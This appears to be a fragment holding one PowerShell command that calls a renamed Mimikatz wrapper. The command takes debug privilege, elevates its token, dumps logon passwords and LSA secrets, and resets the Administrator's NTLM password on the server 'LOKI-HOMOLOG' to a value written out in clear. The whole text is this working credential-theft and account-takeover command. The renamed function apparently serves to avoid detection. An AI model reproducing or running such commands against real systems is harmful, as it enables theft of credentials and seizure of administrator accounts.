...
Invoke-SoHighSoHigh -Command '"privile''ge::debug" "token::elevate" "sekurlsa::logonPasswords full" "lsadump::secrets" "lsadump::setntlm /server:LOKI-HOMOLOG /user:Administrator /password:Sidkron@443"'
